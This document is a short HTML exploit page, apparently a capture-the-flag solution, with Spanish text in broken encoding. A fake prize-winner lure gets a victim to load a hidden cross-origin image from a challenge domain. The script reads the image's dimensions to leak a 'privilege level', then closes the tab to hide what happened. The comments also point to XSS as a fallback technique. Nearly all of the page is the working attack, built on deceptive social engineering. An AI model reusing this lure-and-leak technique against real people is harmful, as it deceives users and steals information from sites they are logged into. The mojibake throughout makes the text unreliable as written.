<!DOCTYPE html>
<html>
<head>
    <title>¬°Felicidades, ganaste algo!</title>
    <meta charset="UTF-8">
</head>
<body>

    <h1>üéâ ¬°Has sido seleccionado para un premio! üéâ</h1>
    <p>Solo haz clic en el bot√≥n para reclamarlo y vuelve a la pesta√±a anterior.</p>
    <button onclick="cerrarVentana()">Reclamar mi premio</button>

    <script>
        const DOMINIO_DESAFIO = "https://chl-0be918a6-5b4f-4de5-b30a-669e10a3cf51-imagen-importante.softwareseguro.com.ar";
        const URL_IMAGEN = DOMINIO_DESAFIO + "/profile-pic";
        
        // 1. Crear un elemento de imagen oculto
        const img = new Image();
        // Intentar forzar el modo CORS an√≥nimo. Esto es necesario si el servidor del desaf√≠o 
        // no tiene cabeceras CORS, pero puede fallar si la configuraci√≥n es estricta.
        img.crossOrigin = "anonymous"; 
        
        // 2. Definir lo que haremos cuando la imagen cargue
        img.onload = function() {
            // Obtener las dimensiones originales (naturales) de la imagen
            const ancho = img.naturalWidth;
            const alto = img.naturalHeight;

            // Calcular el Nivel de Privilegio: ancho x alto
            const nivel = ancho * alto;

            // 3. Mostrar el resultado
            let resultado = `‚úÖ Imagen Cargada: ${ancho}x${alto} p√≠xeles.`;
            resultado += `<br>‚úÖ Nivel de Pepe: ${nivel}`;
            resultado += `<br>üö® **HASH MD5 requerido de:** ${nivel}`;

            document.body.innerHTML += `<p style="color: red; font-weight: bold;">${resultado}</p>`;
        };
        
        img.onerror = function() {
            // Manejo de error: Falla de carga o bloqueo por la Pol√≠tica de Mismo Origen (SOP).
            // Si ves este error, el desaf√≠o podr√≠a requerir otra t√©cnica (como XSS en el sitio principal)
            document.body.innerHTML += "<p style='color: orange; font-weight: bold;'>‚ö†Ô∏è Error al cargar la imagen. Es posible que el navegador de Pepe est√© bloqueando el acceso a las dimensiones por seguridad (SOP).</p>";
        };

        // 4. Iniciar la carga de la imagen
        img.src = URL_IMAGEN;

        // Funci√≥n para cerrar la pesta√±a y dar la ilusi√≥n de "ataque completado"
        function cerrarVentana() {
            window.close();
            alert("¬°Premio reclamado! Vuelve a la pesta√±a anterior.");
        }
    </script>
</body>
</html>
